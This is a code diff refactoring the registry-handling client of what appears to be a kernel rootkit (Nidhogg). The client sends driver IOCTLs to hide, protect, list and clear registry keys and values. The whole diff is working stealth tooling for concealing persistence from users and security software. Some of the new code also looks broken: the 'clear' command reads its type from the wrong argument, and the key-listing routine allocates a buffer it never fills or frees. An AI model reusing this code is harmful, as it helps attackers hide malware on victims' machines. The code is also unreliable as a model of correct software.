@@ -70,7 +70,15 @@ void RegistryHandler::HandleCommand(_In_ std::string command) {
 	else if (params.at(0) == L"list") {
 		if (params.at(1) == L"hidden") {
 			if (params.at(2) == L"keys") {
-				std::vector<std::wstring> hiddenKeys = ListHiddenKeys();
+				std::vector<std::wstring> hiddenKeys;
+
+				try {
+					hiddenKeys = ListKeys(RegItemType::HiddenKey);
+				}
+				catch (const RegistryHandlerException& e) {
+					std::wcerr << L"Failed to list hidden registry keys: " << e.what() << std::endl;
+					return;
+				}
 
 				if (hiddenKeys.empty()) {
 					std::wcout << L"No hidden registry keys found." << std::endl;
@@ -84,17 +92,25 @@ void RegistryHandler::HandleCommand(_In_ std::string command) {
 				return;
 			}
 			else if (params.at(2) == L"values") {
-				auto hiddenValues = ListHiddenValues();
+				RegValueList hiddenValues;
 
-				if (hiddenValues.Values.empty()) {
+				try {
+					hiddenValues = ListValues(RegItemType::HiddenValue);
+				}
+				catch (const RegistryHandlerException& e) {
+					std::wcerr << L"Failed to list hidden registry values: " << e.what() << std::endl;
+					return;
+				}
+
+				if (hiddenValues.empty()) {
 					std::wcout << L"No hidden registry values found." << std::endl;
 					return;
 				}
 				std::wcout << L"Hidden registry values:" << std::endl;
 
-				for (SIZE_T i = 0; i < hiddenValues.Values.size(); i++) {
-					std::wcout << L"Key: " << hiddenValues.Keys.at(i) << L", Value: "
-						<< hiddenValues.Values.at(i) << std::endl;
+				for (SIZE_T i = 0; i < hiddenValues.size(); i++) {
+					std::wcout << L"Key: " << std::get<0>(hiddenValues[i]) << L", Value: "
+						<< std::get<1>(hiddenValues[i]) << std::endl;
 				}
 				return;
 			}
@@ -102,7 +118,15 @@ void RegistryHandler::HandleCommand(_In_ std::string command) {
 
 		else if (params.at(1) == L"protected") {
 			if (params.at(2) == L"keys") {
-				std::vector<std::wstring> protectedKeys = ListProtectedKeys();
+				std::vector<std::wstring> protectedKeys;
+				
+				try {
+					protectedKeys = ListKeys(RegItemType::ProtectedKey);
+				} 
+				catch (const RegistryHandlerException& e) {
+					std::cerr << "Failed to list protected registry keys: " << e.what() << std::endl;
+					return;
+				}
 
 				if (protectedKeys.empty()) {
 					std::wcout << L"No protected registry keys found." << std::endl;
@@ -116,17 +140,25 @@ void RegistryHandler::HandleCommand(_In_ std::string command) {
 				return;
 			}
 			else if (params.at(2) == L"values") {
-				auto protectedValues = ListProtectedValues();
+				RegValueList protectedValues;
 
-				if (protectedValues.Values.empty()) {
+				try {
+					protectedValues = ListValues(RegItemType::ProtectedValue);
+				}
+				catch (const RegistryHandlerException& e) {
+					std::cerr << "Failed to list protected registry values: " << e.what() << std::endl;
+					return;
+				}
+
+				if (protectedValues.empty()) {
 					std::wcout << L"No protected registry values found." << std::endl;
 					return;
 				}
 				std::wcout << L"Protected registry values:" << std::endl;
 
-				for (SIZE_T i = 0; i < protectedValues.Values.size(); i++) {
-					std::wcout << L"Key: " << protectedValues.Keys.at(i) << L", Value: "
-						<< protectedValues.Values.at(i) << std::endl;
+				for (SIZE_T i = 0; i < protectedValues.size(); i++) {
+					std::wcout << L"Key: " << std::get<0>(protectedValues[i]) << L", Value: "
+						<< std::get<1>(protectedValues[i]) << std::endl;
 				}
 				return;
 			}
@@ -135,7 +167,55 @@ void RegistryHandler::HandleCommand(_In_ std::string command) {
 		PrintHelp();
 	}
 	else if (params.at(1) == L"clear") {
-		ClearAll();
+		if (params.size() != 2 && params.size() != 3) {
+			PrintHelp();
+			return;
+		}
+		std::wstring type = params.at(1);
+
+		if (type.compare(L"all") == 0) {
+			ClearRegItem(RegItemType::All) ? std::wcout << L"Cleared all hidden and protected registry keys and values" 
+				<< std::endl :
+				std::wcerr << L"Failed to clear all hidden and protected registry keys and values" << std::endl;
+			return;
+		}
+		else if (type.compare(L"hidden") == 0) {
+			if (params.size() != 3) {
+				PrintHelp();
+				return;
+			}
+			if (params.at(2).compare(L"keys") == 0) {
+				ClearRegItem(RegItemType::HiddenKey) ? std::wcout << L"Cleared all hidden registry keys" << std::endl :
+					std::wcerr << L"Failed to clear hidden registry keys" << std::endl;
+			}
+			else if(params.at(2).compare(L"values") == 0) {
+				ClearRegItem(RegItemType::HiddenValue) ? std::wcout << L"Cleared all hidden registry values" << std::endl :
+					std::wcerr << L"Failed to clear hidden registry values" << std::endl;
+			}
+			else {
+				PrintHelp();
+			}
+		}
+		else if (type.compare(L"protected") == 0) {
+			if (params.size() != 3) {
+				PrintHelp();
+				return;
+			}
+			if (params.at(2).compare(L"keys") == 0) {
+				ClearRegItem(RegItemType::ProtectedKey) ? std::wcout << L"Cleared all protected registry keys" << std::endl :
+					std::wcerr << L"Failed to clear protected registry keys" << std::endl;
+			}
+			else if (params.at(2).compare(L"values") == 0) {
+				ClearRegItem(RegItemType::ProtectedValue) ? std::wcout << L"Cleared all protected registry values" << std::endl :
+					std::wcerr << L"Failed to clear protected registry values" << std::endl;
+			}
+			else {
+				PrintHelp();
+			}
+		}
+		else {
+			PrintHelp();
+		}
 	}
 	else {
 		PrintHelp();
@@ -249,8 +329,9 @@ std::wstring RegistryHandler::ParseRegistryKey(_In_ const std::wstring& key) {
 */
 bool RegistryHandler::ProtectKey(_In_ const std::wstring& key, _In_ bool protect) {
 	DWORD returned = 0;
-	RegItem item{};
 	std::wstring kernelSyntaxRegistryKey = L"";
+	IoctlRegItem item{};
+	item.Type = RegItemType::ProtectedKey;
 
 	try {
 		kernelSyntaxRegistryKey = ParseRegistryKey(key);
@@ -263,9 +344,8 @@ bool RegistryHandler::ProtectKey(_In_ const std::wstring& key, _In_ bool protect
 	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN)
 		return false;
 
-	DWORD ioctl = protect ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
+	DWORD ioctl = protect ? IOCTL_PROTECT_HIDE_REGITEM : IOCTL_UNPROTECT_UNHIDE_REGITEM;;
 	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
-	item.Type = RegItemType::RegProtectedKey;
 
 	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
 }
@@ -283,8 +363,9 @@ bool RegistryHandler::ProtectKey(_In_ const std::wstring& key, _In_ bool protect
 */
 bool RegistryHandler::HideKey(_In_ const std::wstring& key, _In_ bool hide) {
 	DWORD returned = 0;
-	RegItem item{};
 	std::wstring kernelSyntaxRegistryKey = L"";
+	IoctlRegItem item{};
+	item.Type = RegItemType::HiddenKey;
 
 	try {
 		kernelSyntaxRegistryKey = ParseRegistryKey(key);
@@ -295,9 +376,8 @@ bool RegistryHandler::HideKey(_In_ const std::wstring& key, _In_ bool hide) {
 	}
 	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN)
 		return false;
-	DWORD ioctl = hide ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
+	DWORD ioctl = hide ? IOCTL_PROTECT_HIDE_REGITEM : IOCTL_UNPROTECT_UNHIDE_REGITEM;
 	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
-	item.Type = RegItemType::RegHiddenKey;
 	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
 }
 
@@ -315,8 +395,9 @@ bool RegistryHandler::HideKey(_In_ const std::wstring& key, _In_ bool hide) {
 */
 bool RegistryHandler::ProtectValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool protect) {
 	DWORD returned = 0;
-	RegItem item{};
 	std::wstring kernelSyntaxRegistryKey = L"";
+	IoctlRegItem item{};
+	item.Type = RegItemType::ProtectedValue;
 
 	try {
 		kernelSyntaxRegistryKey = ParseRegistryKey(key);
@@ -328,10 +409,9 @@ bool RegistryHandler::ProtectValue(_In_ const std::wstring& key, _In_ const std:
 	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN || valueName.length() > REG_VALUE_LEN)
 		return false;
 
-	DWORD ioctl = protect ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
+	DWORD ioctl = protect ? IOCTL_PROTECT_HIDE_REGITEM : IOCTL_UNPROTECT_UNHIDE_REGITEM;
 	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
 	wcscpy_s(item.ValueName, valueName.length() + 1, valueName.data());
-	item.Type = RegItemType::RegProtectedValue;
 	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
 }
 
@@ -350,8 +430,9 @@ bool RegistryHandler::ProtectValue(_In_ const std::wstring& key, _In_ const std:
 */
 bool RegistryHandler::HideValue(_In_ const std::wstring& key, _In_ const std::wstring& valueName, _In_ bool hide) {
 	DWORD returned = 0;
-	RegItem item{};
 	std::wstring kernelSyntaxRegistryKey = L"";
+	IoctlRegItem item{};
+	item.Type = RegItemType::HiddenValue;
 
 	try {
 		kernelSyntaxRegistryKey = ParseRegistryKey(key);
@@ -362,103 +443,44 @@ bool RegistryHandler::HideValue(_In_ const std::wstring& key, _In_ const std::ws
 	}
 	if (kernelSyntaxRegistryKey.length() > REG_KEY_LEN || valueName.length() > REG_VALUE_LEN)
 		return false;
-	DWORD ioctl = hide ? IOCTL_PROTECT_REGITEM : IOCTL_UNPROTECT_REGITEM;
+	DWORD ioctl = hide ? IOCTL_PROTECT_HIDE_REGITEM : IOCTL_UNPROTECT_UNHIDE_REGITEM;
 	wcscpy_s(item.KeyPath, kernelSyntaxRegistryKey.length() + 1, kernelSyntaxRegistryKey.data());
 	wcscpy_s(item.ValueName, valueName.length() + 1, valueName.data());
-	item.Type = RegItemType::RegHiddenValue;
 	return DeviceIoControl(hNidhogg.get(), ioctl, &item, sizeof(item), nullptr, 0, &returned, nullptr);
 }
 
 /*
 * Description:
-* ListProtectedKeys is responsible for listing all protected registry keys.
+* ListKeys is responsible for listing all registry keys.
 * 
 * Parameters:
-* There are no parameters.
+* @type	[_In_ RegItemType]		    -- The type of registry items to be listed (protected or hidden).
 * 
 * Returns:
-* @std::vector<std::wstring> -- A vector containing the names of all protected registry keys.
+* @keys [std::vector<std::wstring>] -- Vector of protected registry keys.
 */
-std::vector<std::wstring> RegistryHandler::ListProtectedKeys() {
-	RegItem result{};
-	std::vector<std::wstring> keys;
-	int amountOfKeys = 0;
+std::vector<std::wstring> RegistryHandler::ListKeys(_In_ RegItemType type) {
 	DWORD returned = 0;
+	std::vector<std::wstring> keys;
+	IoctlRegistryList result{};
+	result.Type = type;
 
-	result.RegItemsIndex = 0;
-	result.Type = RegItemType::RegProtectedKey;
-
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
+	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_REGITEMS,
 		&result, sizeof(result),
 		&result, sizeof(result), &returned, nullptr))
 		throw RegistryHandlerException("Failed to list protected registry keys");
-	amountOfKeys = result.RegItemsIndex;
 
-	if (amountOfKeys == 0)
-		return keys;
-
-	keys.push_back(std::wstring(result.KeyPath));
-	result.KeyPath[0] = L'\0';
-
-	for (int i = 1; i < amountOfKeys; i++) {
-		result.RegItemsIndex = i;
-
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
-			nullptr, 0,
-			&result, sizeof(result), &returned, nullptr)) {
-
-			keys.clear();
-			throw RegistryHandlerException("Failed to list protected registry keys");
+	if (result.Count > 0) {
+		try {
+			result.Items = SafeAlloc<IoctlRegItem*>(result.Count * sizeof(IoctlRegItem));
+		}
+		catch (SafeMemoryException& e) {
+			throw RegistryHandlerException("Failed to allocate memory for registry keys list");
 		}
 
-		keys.push_back(std::wstring(result.KeyPath));
-		result.KeyPath[0] = L'\0';
-	}
-
-	return keys;
-}
-
-/*
-* Description:
-* ListHiddenKeys is responsible for listing all hidden registry keys.
-* 
-* Parameters:
-* There are no parameters.
-* 
-* Returns:
-* @std::vector<std::wstring> -- A vector containing the names of all hidden registry keys.
-*/
-std::vector<std::wstring> RegistryHandler::ListHiddenKeys() {
-	RegItem result{};
-	std::vector<std::wstring> keys;
-	int amountOfKeys = 0;
-	DWORD returned = 0;
-	result.RegItemsIndex = 0;
-	result.Type = RegItemType::RegHiddenKey;
-
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
-		&result, sizeof(result),
-		&result, sizeof(result), &returned, nullptr)) {
-		throw RegistryHandlerException("Failed to list protected registry keys");
-	}
-	amountOfKeys = result.RegItemsIndex;
-
-	if (amountOfKeys == 0)
-		return keys;
-	keys.push_back(std::wstring(result.KeyPath));
-	result.KeyPath[0] = L'\0';
-
-	for (int i = 1; i < amountOfKeys; i++) {
-		result.RegItemsIndex = i;
-
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
-			nullptr, 0,
-			&result, sizeof(result), &returned, nullptr)) {
-			keys.clear();
-			throw RegistryHandlerException("Failed to list protected registry keys");
+		for (SIZE_T i = 0; i < result.Count; i++) {
+			keys.push_back(std::wstring(result.Items[i].KeyPath));
 		}
-		keys.push_back(std::wstring(result.KeyPath));
-		result.KeyPath[0] = L'\0';
 	}
 	return keys;
 }
@@ -468,114 +490,58 @@ std::vector<std::wstring> RegistryHandler::ListHiddenKeys() {
 * ListProtectedValues is responsible for listing all protected registry values.
 * 
 * Parameters:
-* There are no parameters.
+* @type	  [_In_ RegItemType] -- The type of registry items to be listed (protected or hidden).
 * 
 * Returns:
-* @RegistryQueryResult -- A structure containing the names of all protected registry keys and their values.
+* @values [RegValueList]	 -- Vector of registry keys and their values.
 */
-RegistryQueryResult RegistryHandler::ListProtectedValues() {
+RegValueList RegistryHandler::ListValues(_In_ RegItemType type) {
 	DWORD returned;
-	RegItem result{};
-	RegistryQueryResult queryResult{};
-	int amountOfValues = 0;
-	result.RegItemsIndex = 0;
-	result.Type = RegItemType::RegProtectedValue;
+	IoctlRegistryList result{};
+	RegValueList values{};
+	std::tuple<std::wstring, std::wstring> currentValue;
+	result.Type = type;
 
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
+	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_REGITEMS,
 		&result, sizeof(result),
 		&result, sizeof(result), &returned, nullptr)) {
-		queryResult.Values.clear();
-		throw RegistryHandlerException("Failed to list protected registry values");
+		throw RegistryHandlerException("Failed to list registry values");
 	}
-	amountOfValues = result.RegItemsIndex;
 
-	if (amountOfValues == 0)
-		return queryResult;
-	queryResult.Keys.push_back(std::wstring(result.KeyPath));
-	queryResult.Values.push_back(std::wstring(result.ValueName));
-	result.KeyPath[0] = L'\0';
-	result.ValueName[0] = L'\0';
-
-	for (int i = 1; i < amountOfValues; i++) {
-		result.RegItemsIndex = i;
-
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
-			nullptr, 0,
-			&result, sizeof(result), &returned, nullptr)) {
-			queryResult.Values.clear();
-			queryResult.Keys.clear();
-			throw RegistryHandlerException("Failed to list protected registry values");
+	if (result.Count > 0) {
+		try {
+			result.Items = SafeAlloc<IoctlRegItem*>(result.Count * sizeof(IoctlRegItem));
 		}
-		queryResult.Keys.push_back(std::wstring(result.KeyPath));
-		queryResult.Values.push_back(std::wstring(result.ValueName));
-		result.KeyPath[0] = L'\0';
-		result.ValueName[0] = L'\0';
+		catch (SafeMemoryException& e) {
+			throw RegistryHandlerException("Failed to allocate memory for registry values list");
+		}
+		if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_REGITEMS,
+			&result, sizeof(result),
+			&result, sizeof(result), &returned, nullptr)) {
+			SafeFree(result.Items);
+			throw RegistryHandlerException("Failed to list registry values");
+		}
+
+		for (SIZE_T i = 0; i < result.Count; i++) {
+			std::get<0>(currentValue) = std::wstring(result.Items[i].KeyPath);
+			std::get<1>(currentValue) = std::wstring(result.Items[i].ValueName);
+			values.push_back(currentValue);
+		}
 	}
-	return queryResult;
+	return values;
 }
 
 /*
 * Description:
-* ListHiddenValues is responsible for listing all hidden registry values.
+* ClearRegItem is responsible for clearing all registry of item type.
 * 
 * Parameters:
-* There are no parameters.
-* 
-* Returns:
-* @RegistryQueryResult -- A structure containing the names of all hidden registry keys and their values.
-*/
-RegistryQueryResult RegistryHandler::ListHiddenValues() {
-	DWORD returned = 0;
-	RegItem result{};
-	RegistryQueryResult queryResult{};
-	int amountOfValues = 0;
-	result.RegItemsIndex = 0;
-	result.Type = RegItemType::RegHiddenValue;
-
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
-		&result, sizeof(result),
-		&result, sizeof(result), &returned, nullptr)) {
-		queryResult.Values.clear();
-		throw RegistryHandlerException("Failed to list hidden registry values");
-	}
-	amountOfValues = result.RegItemsIndex;
-
-	if (amountOfValues == 0)
-		return queryResult;
-	queryResult.Keys.push_back(std::wstring(result.KeyPath));
-	queryResult.Values.push_back(std::wstring(result.ValueName));
-	result.KeyPath[0] = L'\0';
-	result.ValueName[0] = L'\0';
-
-	for (int i = 1; i < amountOfValues; i++) {
-		result.RegItemsIndex = i;
-
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_QUERY_REGITEMS,
-			nullptr, 0,
-			&result, sizeof(result), &returned, nullptr)) {
-			queryResult.Values.clear();
-			queryResult.Keys.clear();
-			throw RegistryHandlerException("Failed to list hidden registry values");
-		}
-		queryResult.Keys.push_back(std::wstring(result.KeyPath));
-		queryResult.Values.push_back(std::wstring(result.ValueName));
-		result.KeyPath[0] = L'\0';
-		result.ValueName[0] = L'\0';
-	}
-	return queryResult;
-}
-
-/*
-* Description:
-* ClearAll is responsible for clearing all registry protections and hiding.
-* 
-* Parameters:
-* There are no parameters.
+* @type [_In_ RegItemType] -- The type of registry items to be cleared (protected or hidden).
 * 
 * Returns:
 * @bool -- Whether the operation was successful or not.
 */
-bool RegistryHandler::ClearAll() {
+bool RegistryHandler::ClearRegItem(_In_ RegItemType type) {
 	DWORD returned;
-	return DeviceIoControl(hNidhogg.get(), IOCTL_CLEAR_REGITEMS, nullptr, 0, nullptr, 0, &returned, nullptr);
+	return DeviceIoControl(hNidhogg.get(), IOCTL_CLEAR_REGITEMS, &type, sizeof(type), nullptr, 0, &returned, nullptr);
 }
